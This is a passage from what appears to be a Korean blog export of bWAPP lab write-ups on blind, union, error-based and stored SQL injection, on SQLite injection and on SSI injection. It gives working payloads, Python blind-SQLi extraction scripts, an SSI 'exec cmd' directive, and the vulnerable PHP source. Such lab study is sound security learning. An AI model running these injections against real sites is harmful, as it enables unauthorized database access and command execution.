하나만 true면 true가 된다. 하지만 and는 둘 다 true이어야 true가 된다. ' or '1'='1' and length(database())=1;# ' or '1'='1' and length(database())=5;# 위 SQLi를 실행한 결과 DB의 이름 길이는 5자리인 것으로 파악인 된다. DB의 이름 파악substring 함수를 이용하여 DB의 이름을 알아낼 것이다.substring 함수는 지정된 부분에서 몇 번째 문자를 출력하는 함수이다. ex). DB 이름 -&gt; 원투 -&gt; substring(database(),2,1) -&gt; 투 이러한 방법은 파이썬을 이용하여 알아내겠다. Python Code1234567891011121314151617181920212223242526272829303132333435import requestsfrom bs4 import BeautifulSoupfrom string import ascii_lowercasealpha_list = list(ascii_lowercase) #소문자 알파벳 a~z를 리스트로 저장url = input() #시도할 url 입력db_name = 'DB의 이름 : ' #DB 이름의 알파벳을 저장할 str 변수index = 1 #몇번째 자리를 검사할지 결정하는 변수while True: for _ in alpha_list: #SQLi 쿼리 sqli = f&quot;{url}?title=%27+or+%271%27%3D%271%27+and+substring%28database%28%29%2C{index}%2C1%29%3D%27{_}%27%23&amp;action=search&quot; #세션값을 같이 보내주어 세션 인증 #PHPSESSID은 확인하여 자신의 세션값을 넣으면 된다. headers = {'security_level' : '0', 'PHPSESSID' : '898fa528555e536555feb61910c792c8'} response = requests.get(sqli, cookies=headers) html = response.text soup = BeautifulSoup(html, 'html.parser') result = soup.select_one('div#main') #결과가 맞는지 확인하는 조건문 if result.contents[-1].replace('\\n', '') == ' The movie exists in our database!': db_name += _ #SQLi 쿼리에 True가 나온 알파벳 저장 break index += 1 if index &gt; 5: break print(db_name) 파이썬 코드로 간단하게 만들었다.처음 파이썬을 접하거나 크롤링을 안해봤던 사람들은 인터넷에 검색하면서 하는데 시간이 좀 걸리겠지만, 금방 할 수 있을 것이다. ' or 1=1 and database()='bwapp'#결과값으로 bwapp을 얻을 수 있었다. 테이블 이름의 길이 파악일단 이름을 파악하기 위해선 이름의 길이를 파악을 해야한다. limit를 이용하여 출력되는 레코드의 개수를 제한한다.' or 1=1 and length((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1))=~#~를 1부터 시작하여 길이에 맞는 값이 나오면 참이 출력될 것이다. 입력 : ' or 1=1 and length((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1))=1#값이 False가 나왔으니 결과값이 DB에 존재하지 않는다고 출력된다. 입력 : ' or 1=1 and length((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1))=4#True가 나왔으니, 테이블 이름의 길이는 4로 판단이 된다. 테이블 이름 파악' or 1=1 and substring((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1),1,1)='~'#이번 역시 substring 함수를 이용하여 이름의 한글자 하나하나 검사하였다. Python Code123456789101112131415161718192021222324252627282930313233import requestsfrom bs4 import BeautifulSoupfrom string import ascii_lowercasealpha_list = list(ascii_lowercase)url = input()db_name = '테이블의 이름 : 'index = 1while True: for _ in alpha_list: sqli = f&quot;{url}?title=%27+or+1=1+and+substring((select+table_name+from+information_schema.tables+where+table_schema=%27bwapp%27+limit+0,1),{index},1)=%27{_}%27%23&amp;action=search&quot; #세션값을 같이 보내주어 세션 인증 #PHPSESSID은 확인하여 자신의 세션값을 넣으면 된다. headers = {'security_level' : '0', 'PHPSESSID' : '321bc53ee5ae297a46333feceff717dd'} response = requests.get(sqli, cookies=headers) html = response.text soup = BeautifulSoup(html, 'html.parser') result = soup.select_one('div#main') if result.contents[-1].replace('\\n', '') == ' The movie exists in our database!': db_name += _ break index += 1 if index &gt; 4: break print(db_name) ' or 1=1 and (select table_name from information_schema.tables where table_schema='bwapp' limit 0,1)='blog'#결과로 blog가 나왔다.","link":"/2021/01/21/SQL-Injection-Blind-Boolean-Based/"},{"title":"SQL Injection - Blind (Time-Based)","text":"Low결과는 이메일로 전송된다는 말을 보니 페이지에선 어떠한 결과을 받을 수 없을 것 같다. sleep 함수를 사용하면 출력하는 것이 지연된다. 이것을 이용하여 지연이 되면 참, 안되면 거짓으로 판단 할 수 있다. 입력 : ' or 1=1 and sleep(1)#1초 지연 후 출력되는 것을 볼 수 있다. SQLi - Blind (Boolean-based)과 같은 방식에 위와 같은 조건을 추가하면, 지연이 되는 것을 보고 참과 거짓을 판단할 수 있을 것이다.Ex). ' or 1=1 and length(database())=~ and sleep(5)#","link":"/2021/01/21/SQL-Injection-Blind-Time-Based/"},{"title":"SQL Injection(Captcha)","text":"Low페이지를 들어갔더니, Captcha를 입력하라는 form이 있어서 입력해보았다. 영화 데이터를 조회할 수 있는 페이지가 나왔고, 오류가 생기면 출력을 하는지 확인하기 위해서 '를 입력하였다. 오류 메시지가 출력되는 것을 확인할 수 있었다. 추가적으로 ' or '1'='1를 입력하여 Injection이 되는 지 확인했는데 잘 되었다.전의 문제와 유사하여, 더 진행하지 않겠다. 또한 소스코드도 같아서 전에 풀이한 문제 링크를 참조하겠다.Link : https://lrtk-coder.github.io/2020/12/18/SQL-Injection-Get-Search/","link":"/2020/12/23/SQL-Injection-Captcha/"},{"title":"SQL Injection(Get&amp;Post&#x2F;Select)","text":"Low이전 문제인 Search 페이지와 유사한 페이지가 나왔다.차이점은 사용자 직접 입력을 하지 않고, HTML 태그의 Option 태그를 이용하여 선택하는 방식으로 변경이 되었다. 나는 개발자 도구와 URL 창에서 서버에 보내주는 movie 변수의 값을 변경하여 SQL Injection하였다. 123456789101112&lt;select name=&quot;movie&quot;&gt; &lt;option value=&quot;1&quot;&gt;G.I. Joe: Retaliation&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;Iron Man&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;Man of Steel&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;Terminator Salvation&lt;/option&gt; &lt;option value=&quot;5&quot;&gt;The Amazing Spider-Man&lt;/option&gt; &lt;option value=&quot;6&quot;&gt;The Cabin in the Woods&lt;/option&gt; &lt;option value=&quot;7&quot;&gt;The Dark Knight Rises&lt;/option&gt; &lt;option value=&quot;8&quot;&gt;The Fast and the Furious&lt;/option&gt; &lt;option value=&quot;9&quot;&gt;The Incredible Hulk&lt;/option&gt; &lt;option value=&quot;10&quot;&gt;World War Z&lt;/option&gt;&lt;/select&gt; 개발자 도구를 이용하여 option 태크의 value 속성을 변경하였다.&lt;option value=&quot;'&quot;&gt;G.I. Joe: Retaliation&lt;/option&gt; 그 후, 서버로 보내서 확인하니 Error 메시지가 출력되는 것을 확인할 수 있었다. 2번째 방법인 URL 창을 이용하는 방법은 영화를 선택한 후 서버로 보내고 난 후의 URL의 파라미터를 이용하여 Injection을 하였다.정상 : /bWAPP/sqli_2.php?movie=1&amp;action=goInjection : /bWAPP/sqli_2.php?movie=1 or 1=1&amp;action=go 여기서 의문이 생길 것이다. 왜 '를 입력하지 않는지그 이유는 이 페이지에선 Id값 즉, 정수를 입력받아 처리하기 때문에 ‘’이 필요가 없다.그래서 Injecion할 때 '를 쓰지 않았다. 위의 Injection이 오류 없이 실행이 된 모습이다.하지만 출력된 데이터는 단 하나 뿐이다. 추측 상으로 단 하나의 데이터만 출력되겠끔 설계되어 있는 것 같다. 만약 여기에 Union 기반 Injection을 시도한다면, 맨 아래에 출력되기 때문에 앞에 출력된 데이터가 출력이 안되게 해야한다.방법은 간단하다. 1=1이라는 참을 거짓으로 만드면 된다. 물론 조건인 or를 and로 변경하여 해당 값 자체를 거짓으로 만들어야한다. 입력 : /bWAPP/sqli_2.php?movie=1 and 1=0 union select 1,2,3,4,5,6,7 그 이후에는 SQL Injection Search 문제를 참고하면 된다. Source Codefunctions_external.php 123function no_check($data){ return $data;} sqli_2.php 1234567891011121314151617if(isset($_GET[&quot;movie&quot;])){ $id = $_GET[&quot;movie&quot;]; $sql = &quot;SELECT * FROM movies&quot;; // If the user selects a movie if($id) { $sql.= &quot; WHERE id = &quot; . sqli($id); } $recordset = mysql_query($sql, $link);} $sql.= &quot; WHERE id = &quot; . sqli($id);를 보면 우리가 입력 받은 값을 아무 검증 없이 sql문에 넣는 모습를 볼 수 있다. Medium123function sqli_check_2($data){ return mysql_real_escape_string($data); } mysql_real_escape_string 함수의 우회 방법은 찾는대로 업로드하겠습니다. High이 문제는 High 문제가 없다.","link":"/2020/12/19/SQL-Injection-Get-Post-Select/"},{"title":"SQL Injection(Get&amp;Post&#x2F;Search)","text":"Low페이지를 보니 영화를 검색하는 페이지인 것 같다.어떤 영화가 있는지 잘 모르겠어서 Form에 a만 입력하여 검색을 해보았다. 영화 제목에 a가 들어간 영화가 출력이 되었다.SQL에 에러를 일으켜서 어떤 에러가 일어나는지 확인을 하였다. 입력값 : '현재 사용 중인 DB는 Mysql인 것으로 확인할 수 있었다.이와 같이 에러를 발생시켜서 에러 메시지로부터 DB 정보를 얻어내는 기법을 Error Based Injection이라고 한다. 또한 추측상으로 select ~~~ from ~~~ where '입력값';으로 이루어진 sql문이라고 추측을 해본다. 그래서 입력을 '을 했을 때 오류가 뜬 이유가 select ~~~ from ~~~ where ''';으로 되어서 오류가 출력된 것으로 생각을 한다. Error Based Injection으로도 볼 수 있는 '1'='1'을 이용하여 모든 데이터를 출력하겠다. 입력값 : ' or '1'='1잘 먹히는 것을 볼 수 있다.다른 SQL Injection 공격 방법인 Union Based SQL Injecion를 시도하여 영화의 데이터가 저장된 테이블에 몇 개의 컬럼이 있는지 확인하겠다. 입력값 : ' union select 1,2,3,4,5,6,7#페에지에 나온 컬럼(Title, Release, Character, Genre, IMDb) 5개 이상으로 생각하여 15부터 시작하였고, 17 때에 성공하였다.테이블 제일 밑에 Union에 의해 합쳐서 출력된 1~7을 보니 1은 나타나지 않고 2부터 나타났다. 또한 7도 나타나지 않았다.아마 1번째 컬럼은 ID 컬럼으로 추측이 되고, 7번째 컬럼은 확인을 해봐야하겠다. 입력값 : ' union select 1,table_name,3,4,5,6,7 from information_schema.tables#DB의 메타데이터를 통해 DB에 저장된 테이블명을 출력하였다.관련이 있어보이는 movies이라는 테이블을 찾을 수 있었다. 이 테이블의 컬럼명을 얻어보겠다. 입력값 : ' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='movies'#확인해보니 7번째 컬럼은 tickets_stock이라는 이름을 가진 컬럼으로 알 수 있었다. Source Codefunctions_external.php 123function no_check($data){ return $data;} sqli_1.php 12345678910111213if(isset($_GET[&quot;title&quot;])){ $title = $_GET[&quot;title&quot;]; $sql = &quot;SELECT * FROM movies WHERE title LIKE '%&quot; . sqli($title) . &quot;%'&quot;; $recordset = mysql_query($sql, $link); if(!$recordset){ // die(&quot;Error: &quot; . mysql_error()); &lt;tr height=&quot;50&quot;&gt; &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;&lt;?php die(&quot;Error: &quot; . mysql_error()); ?&gt;&lt;/td&gt; &lt;/tr&gt;} 입력 데이터에 대한 검증이 없다. 또한 Mysql에 Error가 발생하면 그대로 출력하는 코드도 있다. MediumSource CodeMedium 123function sqli_check_1($data){ return addslashes($data);} High 123function sqli_check_2($data){ return mysql_real_escape_string($data);} addslashes 함수는 iFrame Injection에서 설명을 보면 된다. mysql_real_escape_string 함수는 PHP에서 SQL Injection 공격 등을 방어하기 위하여 특수 문자를 치환하기 위한 함수이다. [치환되는 문자] \\x00 \\n \\r \\ ‘, “ \\x1a 위 문자들은 문자 앞에 \\를 붙여서 해당 문자가 작동하지 않도록 치환해준다. 이 두가지 함수를 우회하는 방법이 인터넷에서 몇가지가 있는데 시도를 해보니, 모두 실패하였다.이 부분은 추후에 보강하겠다.","link":"/2020/12/17/SQL-Injection-Get-Search/"},{"title":"SQL Injection(Login Form&#x2F;Hero)","text":"Low로그인 페이지가 나왔다.추측상으로 select ~~~ from ~~~ where id = '입력값' and pw = '입력값'으로 추측이 되기 때문에 '를 입력하여 오류 메시지가 출력되는지 확인하였다. ID 입력 : 'PW 입력 : '오류 메시지는 출력되지 않았다.일단 추측으로 생각한 sql문에 SQL Injection을 넣어보겠다. ID 입력 : ' or '1' = '1'#PW 입력 : aaSQL Injection이 성공하였고, Neo라는 사람으로 로그인되었다.DB에서 가장 첫번째로 있는 사람이 Neo인 듯 하다.이제 Union Based Injection을 시도하여, 데이터베이스의 컬럼 갯수를 알아보겠다. ID 입력 : ' union select 1,2,3,4#PW 입력 : aa첫 시도에 성공하였다.1번은 Number, 2번은 ID, 3번은 PW로 생각하고 4번째부터 시도했는데 컬럼의 갯수가 4개였다.아마 4번째는 secret이 저장된 컬럼인 듯 하다. ID 입력 : ' union select 1,table_name,3,4 from information_schema.tables where table_schema = database() limit 1,1#PW 입력 : aaDB 메타데이터를 이용하여 테이블을 찾아보았다.현재의 페이지에는 하나의 테이블명만 가져올 수 있다. 그래서 limit을 사용하여 테이블명을 파싱하였다. SQL - Limitlimit x, yx -&gt; 시작점y -&gt; 출력할 갯수 x번째부터 시작해서 y개만 출력여기서 주의할 점은 맨 앞 index는 0번부터 시작한다는 점이다. 두번째 테이블명이 Heroes였다. 문제의 제목이 hero가 들어가는 것을 생각하니 연관이 있을거라 생각하여 컬럼명을 조회했다. ID 입력 : ' union select 1,column_name,3,4 from information_schema.columns where table_name='heroes' limit 0,1#PW 입력 : aa컬럼명을 보니 heores 테이블에 데이터가 저장이 되는 것 같다.이제 ID 컬럼과 Login 컬럼을 확인하여 ID값을 찾아보겠다. ID 입력 : ' union select 1,id,3,4 from heroes limit 0,1#PW 입력 : aaID 컬럼은 데이터의 index을 저장하는 컬럼인 것으로 보인다. ID 입력 : ' union select 1,login,3,4 from heroes limit 0,1#PW 입력 : aaLogin 컬럼이 ID 값을 저장한 컬럼인 것을 확실하게 검증하였다.이제 반복하여, ID 값을 뽑아보겠다. [출력된 ID값]Neo, Alice, Thor, Wolverine, Johnny, Seline 출력된 ID 값을 보니, 누가 Superhero인지를 모르겠다.이제 Secret 컬럼을 출력하여, Superhero을 찾아보겠다. ID 입력 : ' union select 1,secret,3,4 from heroes limit 4,1#PW 입력 : aa확인하니 5번째 ID값이 Superhero였다. 즉, Johnny가 슈퍼히어로 고스트라이더였던 것이다. Medium &amp; High추후에 업데이트하겠습니다.","link":"/2020/12/23/SQL-Injection-Login-Form-Hero/"},{"title":"SQL Injection(SQLite)","text":"Low페이지를 보니, Mysql을 사용했던 SQL Injection 문제와 같은 페이지가 나왔다.하지만 이번 문제는 Mysql이 아닌 SQLite을 사용하여 구현한 페이지으로 판단된다.Error을 일으켜 어떤 오류 메시지를 출력하는지 확인하겠다. Error 코드가 출력되었다.검색하니 General error: 1 unable to open database이라는 뜻을 가진 에러 코드였다. 해석하자면, DB에 접속을 할 수 없다는 Error이다. 입력 : ' or '1'='1SQLite도 SQL Injection이 성공하였다. Mysql의 SQL Injection 문제처럼 테이블명, 컬럼명, 컬럼 갯수를 알아보겠다.그리고, Mysql와 어떤 차이점이 있는지 알아보겠다. 입력 : ' union select 1,2,3,4,5,6--Union을 이용하여 컬럼의 수를 알아냈다. 여기서 알 수 있는 점은 SQLite에선 주석 처리를 --로 한다는 것이다. 입력 : ' union select 1,name,3,4,5,6 from sqlite_master where type='table'-- 또는 ' union select 1,tbl_name,3,4,5,6 from sqlite_masterSQLite는 메타데이터가 저장된 곳이 sqlite_master에 저장이 된다. Mysql의 information_schema와 같다고 생각하면 된다.where은 안써도 테이블명이 출력되긴 하지만, 다른 데이터도 출력됨으로 type이 table인 것만 출력하였다. 입력 : ' union select 1,sql,3,4,5,6 from sqlite_master where tbl_name='movies'--SQLite는 별도의 컬럼 필드가 없기 때문에 생성할 때 만든 sql 쿼리를 담고 있는 sql필드를 이용하였다. Source Codefunctions_external.php 123function no_check($data){ return $data; } sql_11.php 1$sql = &quot;SELECT * FROM movies WHERE title LIKE '%&quot; . sqli($title) . &quot;%'&quot;; 검증을 거치지 않고 그대로 sql 쿼리에 입력데이터를 넣어주었다. Medium추후에 업데이트하겠다. Source Code12345678function sqli_check_4($data){ // Not bulletproof // Replaces a single quote (') $input = str_replace(&quot;'&quot;, &quot;''&quot;, $data); return $input;} High이 문제에선 High Level은 없다.","link":"/2020/12/23/SQL-Injection-SQLite/"},{"title":"SQL Injection - Stored (Blog)","text":"Low페이지에 들어가니 전에 풀었던 HTML Injection - Stored (Blog) 문제의 잔재들이 보인다. DB 테이블이 같은 것로 활용하여 문제를 만든 것 같다. ::입력 : ‘aaaaaaa::Error를 일으켜서 Mysql를 사용하였다는 정보를 얻을 수 있었다.또한 URL를 확인하니 파라미터가 없는 것을 알 수 있었다. -&gt; POST를 사용한다는 뜻 12345678910111213141516POST /bWAPP/sqli_7.php HTTP/1.1Host: 192.168.219.164Content-Length: 18Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.219.164Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.219.164/bWAPP/sqli_7.phpAccept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=03d4a89519816567dd8ed545ffa299c5; security_level=0Connection: closeentry=aaa&amp;blog=add Burp Suit를 이용하여 데이터가 어떻게 전송하는지 확인하였다.입력한 데이터는 entry이라는 파라미터, blog 파라미터는 button의 결과값이다. 이제 SQLi이 되는지 확인하였다.오류를 보니 아마 ::INSERT INTO Blog (컬럼1, 컬럼2) VALUES (‘입력값’, ‘bee’)::으로 추측된다. 계정명인 ::’bee’::에 Query를 넣어서 SQLi를 시도하겠다.::입력 : test', (select @@version))#:: -&gt; ::INSERT INTO Blog (컬럼1, 컬럼2) VALUES ('test',(select @@version))#, 'bee')::SQLi가 성공하였다. Union를 사용하여 테이블명, 컬럼명도 알아낼 수 있다.이부분은 전에 풀이하였던 SQLi 문제에서 했던 방식대로 응용하여 시도하면 된다. Source Code12345678910111213141516171819202122if(isset($_POST[&quot;blog&quot;])){ $entry = sqli($_POST[&quot;entry&quot;]); $owner = $_SESSION[&quot;login&quot;]; if($entry == &quot;&quot;){ $message = &quot;&lt;font color=\\&quot;red\\&quot;&gt;Please enter some text...&lt;/font&gt;&quot;; } else{ $sql = &quot;INSERT INTO blog (date, entry, owner) VALUES (now(),'&quot; . $entry . &quot;','&quot; . $owner . &quot;')&quot;; $recordset = $link-&gt;query($sql); if(!$recordset){ die(&quot;Error: &quot; . $link-&gt;error . &quot;&lt;br /&gt;&lt;br /&gt;&quot;); } // Debugging // echo $sql; $message = &quot;&lt;font color=\\&quot;green\\&quot;&gt;The entry was added to our blog!&lt;/font&gt;&quot;; }} Medium &amp; High추후에 업로드하겠습니다. MediumError를 일으키려고 했지만, 특정 문자를 치환하는 SQLi 검증이 있다. Source CodeHighSource CodeSQL Injection 종류 Error Based SQLi -&gt; 오류를 일으켜 DB 정보 획득 Union Based SQLi -&gt; Union를 이용하여 다른 테이블을 결합하여 데이터 획득 Blind SQLi -&gt; 에러나 정보를 얻을 수 없을 때 서버의 반응을 통해 데이터 획득 Stored Procedure SQLi -&gt; 프로시져를 이용하여 Shell을 실행하거나 Query 결과 획득 Boolead Based SQLi Time Based SQLi","link":"/2021/01/21/SQL-Injection-Stored-Blog/"},{"title":"SQL Injection - Stored (SQLite)","text":"LowPHP의 SQLite 모듈을 사용하였다고 써져있다. 어떤 기능을 가진 페이지인지 확인하겠다.입력 : testButton : Add Entry Button : Delete Entries확인을 해보니, Add 버튼은 Form에 입력한 데이터를 DB를 저장하는 기능이고, Delecte 버튼은 DB에 저장된 데이터를 삭제하는 기능이다. Error를 일으켜 정보를 획득하겠다.입력 : ‘오류 메시지는 출력이 안된다.또한 ' or '1' = '1의 경우는 어차피 페이지 기능이 DB에 저장된 데이터를 출력하는 거라서 여기선 필요없다. 아무런 정보가 없어서 추측을 해보겠다.보통 이런 기능은 INSERT 문을 이용하여 DB에 데이터를 추가한다.아마 INSERT INTO table_name (column1, column2, ... column_N) VALUES (data, data,'입력값', data);으로 되어있을거라 추측이 된다. 저 INSERT 문으로 생각하고 SQL Injection를 시도하겠다.INSERT 문에 대한 어떠한 정보도 얻을 수 없어서 test');#부터 시작하여 추가가 안되면, test' 뒤에 , ''를 추가하여 SQLi를 진행하였다.입력 : test’, ‘’);# Form의 입력값이 뒤에서 두번째이며, Owner가 맨 뒤 자리인 것으로 확인되었다.Owner의 자리를 이용하여 SQLi를 더 진행하겠다. 입력 : test’, sqlite_version());# 입력 : test’, (SELECT name FROM sqlite_master WHERE type=’table’ ));# 그 후의 SQLi은 전에 풀이했던 SQLite 문제에서 설명했으니 진행은 안하겠다. Source CodeFunction_external.php 123function no_check($data){ return $data; } sqli_12.php 1$sql = &quot;INSERT INTO blog (id, date, entry, owner) VALUES (&quot; . ++$id . &quot;,'&quot; . date('Y-m-d', time()) . &quot;','&quot; . $entry . &quot;','&quot; . $owner . &quot;');&quot;; 예상한 INSERT 문이 맞았다.Low 문제에선 아무런 검증 없이 바로 데이터를 return하였다. Medium문제 풀이는 추후에 업데이트하겠다. Source CodeFunction_external.php 12345678function sqli_check_4($data){ // Not bulletproof // Replaces a single quote (') $input = str_replace(&quot;'&quot;, &quot;''&quot;, $data); return $input; } High이 문제에선 High가 없다. Medium과 같다.","link":"/2021/01/21/SQL-Injection-Stored-SQLite/"},{"title":"SQL Injection - Stored (User-Agent)","text":"Low들어가보니 아이피랑 User-Agent가 DB에 저장이 된 것 같다. HTML의 a태그인 download를 클릭하니, visitors.txt로 로그가 저장이 되었다. Burp Suite를 이용해서 User-Agent를 '로 수정해서 Error가 일어나는지 확인하겠다.Error가 발생하였고, Mysql로 이루어진 것을 확인하였다. '으로 만으로 INSERT 문이 어떻게 되었는지 확신이 힘들어서 'test'를 넣어서 다시 확인하였다.확인해보니, 이제 INSERT 문을 확신 할 수 있었다.INSERT INTO table_name VALUES (data, ..., User-Agent, IP address);로 된 것으로 추측이 된다. SQLi를 위해 User-Agent : ', version());#로 수정하여 넘겨주었다.SQLi가 성공하였다. 그 이후는 다른 SQLi 문제에서 설명했으니 참고하면 된다. Source Code","link":"/2021/01/21/SQL-Injection-Stored-User-Agent/"},{"title":"SQL Injection - Stored (XML)","text":"Low“Any bugs?” 박스를 클릭하여 반응을 살펴봤지만, 아무 반응이 없었다.개발자 도구를 사용하여 소스코드를 확인해보았다. &lt;input type=&quot;button&quot; onclick=&quot;ResetSecret();&quot; value=&quot;Any bugs?&quot;&gt; 버튼은 클릭 시 ResetSecret 함수를 실행한다. 12345678910111213141516function ResetSecret(){ var xmlHttp; // Code for IE7+, Firefox, Chrome, Opera, Safari if(window.XMLHttpRequest) { xmlHttp = new XMLHttpRequest(); } // Code for IE6, IE5 else { xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } xmlHttp.open(&quot;POST&quot;,&quot;sqli_8-2.php&quot;,true); xmlHttp.setRequestHeader(&quot;Content-type&quot;,&quot;text/xml; charset=UTF-8&quot;); xmlHttp.send(&quot;&lt;reset&gt;&lt;login&gt;bee&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;&quot;);} ResetSecret 함수의 코드를 확인해보니, XHR(XMLHttpRequest) 함수를 사용하여 sqli_8-2.php에 XML 형식의 데이터를 보내고 있었다. Burp Suit을 사용하여 Error를 일으키겠다. Request 123456789101112POST /bWAPP/sqli_8-2.php HTTP/1.1Host: 192.168.219.164Content-Length: 59Content-type: text/xml; charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0Connection: close&lt;reset&gt;&lt;login&gt;'&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 정상 시 나오는 반응 Error 시 나오는 반응여기서는 SQLi를 성공하여 페이지에 데이터를 출력이 안되서, Error Base SQLi로 데이터를 얻어와야한다. SQLi를 시도하기 전, SQL Query를 추측하겠다.있던 데이터의 값을 변경하는 것이니, UPDATE 문을 사용했을 것이다.UPDATE table_name SET secret='Any bugs?' WHERE login like bee으로 추측이 된다. 실패 시 123456789101112POST /bWAPP/sqli_8-2.php HTTP/1.1Host: 192.168.219.164Content-Length: 59Content-type: text/xml; charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0Connection: close&lt;reset&gt;&lt;login&gt;bee'+(select 0 from test)+'&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 성공 시 123456789101112POST /bWAPP/sqli_8-2.php HTTP/1.1Host: 192.168.219.164Content-Length: 59Content-type: text/xml; charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0Connection: close&lt;reset&gt;&lt;login&gt;bee'+(select 0 from users)+'&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; Python을 이용하여 무차별 공격을 시도한다면, 테이블을 찾을 수 있다.또한 login의 값을 무차별 공격을 한다면, login의 데이터 값도 얻을 수 있을 것이다. Source Code","link":"/2021/01/21/SQL-Injection-Stored-XML/"},{"title":"SSI Injection","text":"Server Side Includes이란?HTML 페이지에 사용하는 지시어로, 페이지를 서비스할 때 서버가 처리한다.SSI를 사용하면 CGI 프로그램이나 다른 동적인 기술로 페이지 전체를 만들어서 서비스하지 않고도 HTML 페이지에 동적으로 생성한 내용을 추가할 수 있다. 즉, SSI을 이용하여 악성행위를 Injection할 경우 SSI은 그 지시를 받고 동적으로 페이지를 생성할 것이다. HTML로만 작성된 웹문서와는 달리 SSI코드가 들어있는 파일의 이름은 .shtml이라는 확장자를 가진다. * CGI : Web 서버에서 외부 프로그램과 통신하는 방법을 정의하는 스크립트 또는 프로그램 Low페이지를 보니 BeeBox 웹서버의 IP 주소를 조회하는 기능을 가진 페이지인 것 같다.First Name과 Last Name에 test, test를 입력하여 어떻게 결과가 나오는 확인하였다. Form에 입력했던 값이 그대로 나오고, 밑에 BeeBox 웹서버의 IP 주소이 출력되었다.또한 출력된 페이지는 확장자가 ssii.shtml의 이름을 가진 SSI 파일으로 확인되었다. Form에 SSI 지시어와 HTML 태그를 입력해보았다. First Name : &lt;h1&gt;test&lt;/h1&gt;Last Name : test HTML 태그가 그대로 적용이 된 것을 확인할 수 있었다.이번엔 SSI 지시어를 사용하여 Injection 하겠다. First Name : &lt;!--#exec cmd=&quot;ls&quot; --&gt;Last Name : test Source Codefunctions_external.php 123function no_check($data){ return $data;} ssii.php 12345678910111213141516if($firstname == &quot;&quot; or $lastname == &quot;&quot;){ $field_empty = 1;}else{ $line = '&lt;p&gt;Hello ' . $firstname . ' ' . $lastname . ',&lt;/p&gt;&lt;p&gt;Your IP address is:' . '&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var=&quot;REMOTE_ADDR&quot; --&gt;&lt;/h1&gt;'; // Writes a new line to the file $fp = fopen(&quot;ssii.shtml&quot;, &quot;w&quot;); fputs($fp, $line, 200); fclose($fp); header(&quot;Location: ssii.shtml&quot;); exit;} 빈 입력값을 검증하는 항목은 있지만, 입력값은 그대로 출력한다. MediumLow Level에서 확인해봤던 HTML 태그를 입력해봤더니, 그대로 출력이 되었다.&lt;, &gt;, / 3개의 특수 문자 검증이 없을 것으로 추측이 된다. &quot;, '도 검증 없이 출력이 되는지 확인하겠다.First Name : &lt;!--#exec cmd=&quot;ls&quot; --&gt;Last Name : test 결과는 막힌 것으로 확인되었다. &quot;, '을 검사하여, 치환된 것으로 추측이 된다. First Name : &lt;!--#exec cmd=ls --&gt;Last Name : test &quot;, '을 제거 후 출력 결과를 보니 SSI 지시어가 잘 실행되는 것을 확인 할 수 있었다. Source Code123456function xss_check_4($data){ // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc. // These characters are single quote ('), double quote (&quot;), backslash (\\) and NUL (the NULL byte). // Do NOT use this for XSS or HTML validations!!! return addslashes($data);} addslashes 함수는 iFrame Injection 문제에서 확인할 수 있다.Link : http://lrtk-github.io/2020/12/09/iFrame-Injection-1/ High123456789function xss_check_3($data, $encoding = &quot;UTF-8&quot;){ // htmlspecialchars - converts special characters to HTML entities // '&amp;' (ampersand) becomes '&amp;amp;' // '&quot;' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set // &quot;'&quot; (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set // '&lt;' (less than) becomes '&amp;lt;' // '&gt;' (greater than) becomes '&amp;gt;' return htmlspecialchars($data, ENT_QUOTES, $encoding);} htmlspecialchars 함수도 iFrame Injection 문제에서 확인할 수 있다.","link":"/2020/12/15/SSI-Injection/"},{"title":"Session Mgmt - Administrative Portals","text":"Low 관리자 페이지로 들어가는 것이 이 문제의 목표인 듯 하다.힌트에선, URL를 확인하라고 한다. URL : \\smgmt_admin_portal.php?admin=0확인하니, 파라미터로 admin을 전달하고 있다. 저 파라미터를 조작하면 어떻게 되는지 